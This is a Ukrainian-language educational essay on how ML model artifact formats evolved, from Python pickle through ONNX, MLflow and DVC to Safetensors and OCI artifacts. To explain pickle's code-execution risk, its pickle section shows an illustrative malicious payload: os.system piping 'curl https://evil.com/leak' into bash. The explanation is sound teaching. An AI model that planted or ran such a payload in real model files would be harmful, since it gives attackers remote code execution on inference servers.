# 📜 Еволюція артефактів моделей: від небезпечного pickle до декларативного MLOps

Коли у 2012 році згорткова нейромережа AlexNet зробила прорив у комп'ютерному зорі, перехід навчених алгоритмів із дослідницьких лабораторій у промислову експлуатацію виявився для інженерії несподівано болісним. Дослідники машинного навчання звикли розглядати результат своєї роботи як одиничний файл ваг — масив чисел із плаваючою комою, збережений на диску робочої станції. Проте спроба запустити такий файл у розподіленій бойовій системі миттєво оголила прірву між академічним експериментом і вимогами надійності промислового програмного забезпечення.

Ця вставка розкриває історичну еволюцію того, як інженерна спільнота подолала шлях від вразливої серіалізації скриптових об'єктів до строгих стандартів відтворюваності, нейтральних бінарних форматів та декларативних реєстрів артефактів.

## Епоха бінарних зліпків пам'яті: пастка Python pickle

На ранньому етапі розвитку практичного машинного навчання (кінець 2000-х — середина 2010-х років) домінуючим інструментом дата-саєнтистів була екосистема мови Python: бібліотеки `scikit-learn`, `numpy` та `scipy`. Найпростішим і найпоширенішим способом зберегти навчену модель класифікації чи регресії була стандартна бібліотека `pickle` або її оптимізована для великих числових масивів версія `joblib`.

Механізм `pickle` створювався не як формат обміну моделями, а як засіб серіалізації довільних графів об'єктів мови Python у потік байтів. Для збереження моделі `pickle` записує в бінарний файл інструкції для спеціальної стекової віртуальної машини, які вказують, які класи імпортувати, які екземпляри створити та які внутрішні поля словника (`__dict__`) заповнити. Такий підхід породив дві фундаментальні катастрофи експлуатації.

### 1. Критична вразливість довільного виконання коду (RCE)
Формат `pickle` за своєю природою є виконуваним кодом. Спеціальний магічний метод `__reduce__` дозволяє серіалізованому об'єкту визначити довільну функцію та кортеж аргументів, які середовище зобов'язане викликати під час десеріалізації:

```text
Зловмисник формує файл model.pkl:
[ Інструкція pickle: викликати os.system("curl https://evil.com/leak | bash") ]
                                │
                                ▼
Бойовий сервер викликає: pickle.load(file)
                                │
                                ▼
[ Виконання шкідливого коду з правами інференс-процесу ]
```

Будь-який сервіс, який завантажував `model.pkl` від зовнішніх постачальників чи зі спільного хмарного сховища без криптографічного підпису, ставав вразливим до повної компрометації операційної системи. Жодні спроби ізоляції всередині процесу Python не рятували від виконання сисадмінських викликів ядра.

### 2. Ламкість внутрішніх структур інтерпретатора
Файл `pickle` не зберігає виконуваний код методів класу — він зберігає лише текстову назву модуля та ім'я класу (наприклад, `sklearn.ensemble._forest.RandomForestClassifier`). Якщо на навчальному сервері використовувалася версія бібліотеки `scikit-learn 0.22`, а на сервері інференсу встановлено `scikit-learn 0.24`, внутрішня структура атрибутів дерева рішень змінювалася. Під час завантаження процес викидав незрозумілі помилки `AttributeError` чи `ModuleNotFoundError`, або, що набагато гірше, мовчки спотворював логіку розрахунку ймовірностей через зсув індексів масивів.

Додатково виникав мовний бар'єр: високонавантажений бекенд, написаний на C++, Java чи Go, не міг прочитати `pickle` без запуску важкого повноцінного інтерпретатора CPython через C-API, що створювало гігантські накладні витрати пам'яті та блокування глобального блокувальника інтерпретатора (GIL).

## 2015 рік: прихований технічний борг систем машинного навчання

У 2015 році група провідних інженерів Google (Д. Скаллі, Ґері Голт, Деніел Ґоловня, Майкл Янґ та інші) опублікувала епохальну статтю «Machine Learning: The High-Interest Credit Card of Technical Debt» (*Машинне навчання: кредитна картка з високими відсотками технічного боргу*).

Автори продемонстрували, що в реальних промислових системах сам код машинного навчання (навчання нейромережі чи оптимізація ваг) займає крихітну частку — близько 5% від загального обсягу кодової бази. Решта 95% — це масивна інфраструктурна обв'язка: збір даних, перевірка схем, конфігурація, інженерія ознак, керування ресурсами машин, моніторинг і сервінг.

```text
┌────────────────────────────────────────────────────────────────────────┐
│ Інфраструктура промислової системи машинного навчання                  │
│                                                                        │
│ ┌────────────────┐  ┌───────────────┐  ┌─────────────────────────────┐ │
│ │ Збір даних     │  │ Верифікація   │  │ Виділення ознак             │ │
│ └────────────────┘  └───────────────┘  └─────────────────────────────┘ │
│ ┌───────────────────────────┐  ┌─────┐  ┌────────────────────────────┐ │
│ │ Керування ресурсами       │  │ ML  │  │ Інфраструктура сервінгу    │ │
│ │ кластера (GPU / RAM)      │  │ Код │  │ та низьких затримок        │ │
│ └───────────────────────────┘  └─────┘  └────────────────────────────┘ │
│ ┌───────────────────────────┐  ┌─────────────────────────────────────┐ │
│ │ Моніторинг і детекція     │  │ Керування конфігураціями            │ │
│ │ дрейфу розподілів         │  │ та версіями середовищ               │ │
│ └───────────────────────────┘  └─────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────────┘
```

Стаття сформулювала фундаментальні антипатерни, які переслідували індустрію:
* **Принцип CACE (Changing Anything Changes Everything — Зміна будь-чого змінює все):** на відміну від класичного модульного програмування, де зміни ізольовані інтерфейсами (API), у машинному навчанні зміна гіперпараметра очищення одного вхідного поля або зміна вихідного формату датчика мовчки змінює розподіл усіх наступних ваг і поведінку всієї моделі.
* **Клейовий код (Glue Code) та джунглі конвеєрів (Pipeline Jungles):** використання нескінченних bash-скриптів і неформалізованих скриптів Python для склеювання окремих кроків обробки, де проміжний стан передається через випадкові тимчасові файли на мережевих дисках.
* **Мертві експериментальні шляхи:** залишення в кодовій базі застарілих розгалужень для перевірки альтернативних архітектур моделей, які перетворюють сервер інференсу на некерований моноліт.

Публікація Скаллі та колег змінила парадигму мислення розробників: стало очевидно, що модель не можна трактувати як звичайне статичне програмне забезпечення. Для неї потрібна окрема інженерна дисципліна, яка отримала назву **MLOps** (англ. *Machine Learning Operations*).

## Пошук універсального формату: від PMML до ONNX

Щоб позбутися прив'язки до внутрішнього стану конкретних мов програмування, індустрія почала розробку стандартизованих декларативних форматів представлення моделей.

### 1. PMML та PFA (2000–2015)
Консорціум Data Mining Group (DMG) розробив стандарт **PMML** (англ. *Predictive Model Markup Language*) на основі XML. PMML описував прості статистичні алгоритми (лінійна регресія, дерева ухвалення рішень, наївний байєсівський класифікатор) у вигляді текстового дерева тегів XML. 

Хоча PMML вирішував завдання переносимості між R, Java та Python, він був абсолютно непридатний для сучасного глибокого навчання: текстовий XML збільшував розмір файлів у десятки разів і не міг ефективно описувати мільйони тензорних операцій та нелінійних функцій активації.

### 2. Поява ONNX (2017)
У вересні 2017 року компанії Microsoft та Facebook (нині Meta) за підтримки AWS, NVIDIA та Intel анонсували відкритий стандарт **ONNX** (англ. *Open Neural Network Exchange*).

ONNX зробив три критичні архітектурні кроки:
1. **Формат серіалізації на основі Protocol Buffers:** бінарне, компактне та типізоване представлення графа обчислень та масивів ваг, що забезпечує швидке завантаження через відображення файлів у пам'ять (`mmap`).
2. **Стандартизований граф операторів (ONNX Operators):** формальна специфікація математичних примітивів (згортка, матричне множення, пулінг, нормалізація, функції активації) з чітко зафіксованою семантикою та типами даних.
3. **Відокремлення навчання від інференсу:** дослідники могли навчати модель у PyTorch чи TensorFlow, а потім експортувати її в єдиний файл `.onnx` для запуску на оптимізованому виконуваному рушії **ONNX Runtime**, написаному на чистому C++ без жодних залежностей від середовища Python.

## Революція відтворюваності: ModelDB, MLflow та DVC (2016–2019)

Навіть маючи бінарний формат ваг, інженери стикалися з проблемою втрати контексту. Через пів року після релізу моделі ніхто в компанії не міг відповісти на базові запитання: з якого саме коміту в Git було зібрано код навчання, який знімок бази даних використовувався для побудови тренувальної вибірки, та які метрики якості були зафіксовані на валідаційному тесті.

У 2016 році дослідники лабораторії MIT CSAIL під керівництвом Манасі Вартак презентували дослідницьку систему **ModelDB** — перший централізований каталог для автоматичного журналювання експериментів та відстеження походження моделей.

У 2018 році компанія Databricks на чолі з Матеєм Захарією представила відкриту платформу **MLflow**. MLflow розділив роботу з моделями на чотири модулі:
* `MLflow Tracking` — збір гіперпараметрів, метрик та вихідних файлів під час навчання.
* `MLflow Projects` — пакування коду разом із дескрипторами залежностей (`conda.yaml`, `Dockerfile`).
* `MLflow Models` — стандартний формат директорії (flavor), що містить маніфест `MLmodel`, конфігурацію оточення та сам артефакт.
* `MLflow Model Registry` — централізований реєстр версій моделей із підтримкою життєвого циклу (`Staging`, `Production`, `Archived`) та контролем доступу.

Паралельно розвивався проєкт **DVC** (англ. *Data Version Control*), який адаптував філософію Git для великих бінарних файлів даних. DVC замінив пряме збереження гігабайтних датасетів у репозиторії на збереження легковажних покажчиків із контрольними сумами md5/sha256, які посилалися на незмінні знімки в об'єктному сховищі (S3 / GCS).

## Сучасний етап: Safetensors та OCI-артефакти

На початку 2020-х років масштабування генеративних моделей до сотень мільярдів параметрів поставило нові вимоги до швидкості завантаження ваг та безпеки зберігання.

### Безпека Safetensors (2022)
У 2022 році інженери компанії Hugging Face (Ніколя Патрі та Бенджамін Клавьє) розробили формат **Safetensors**. Його створення було спричинене тим, що формат `PyTorch .pt` використовував під капотом той самий небезпечний механізм `pickle`.

Safetensors реалізував гранично строгу структуру:
* Заголовок у форматі JSON фіксованої довжини, що містить назви тензорів, їхні типи даних (`F32`, `BF16`, `I8`), форми та байти зсуву у файлі.
* Послідовний сирий масив байтів ваг без будь-яких виконуваних інструкцій.

Завдяки цьому Safetensors унеможливив виконання довільного коду на рівні формату файлу та забезпечив пряме нуль-копіювальне відображення ваг у пам'ять процесора та відеокарти (`mmap` безпосередньо у відеопам'ять VRAM), скоротивши час старту великих моделей із хвилин до кількох секунд.

### Контейнеризація моделей (OCI Artifacts та ModelKit)
Останнім кроком в еволюції стало злиття реєстрів моделей із загальноприйнятою інфраструктурою контейнеризації. Завдяки розширенню специфікації OCI (Open Container Initiative), модельні артефакти стали пакуватися в шари OCI-образів. Інструменти на зразок **ModelKit / Kitfile** дозволили зберігати код, конфігурацію, метадані та ваги в єдиному стандартному OCI-реєстрі (Docker Hub, Harbor, AWS ECR), застосовуючи до моделей ті самі перевірки вразливостей, криптографічні підписи (Cosign / Sigstore) та політики доступу, що й до звичайних мікросервісів.

Індустрія остаточно відмовилася від поняття «файл ваг» на користь «незмінного версійованого артефакту», де кожна цифра у відповіді системи однозначно простежується до конкретного рядка вихідного коду, знімка даних та інженерного рішення.
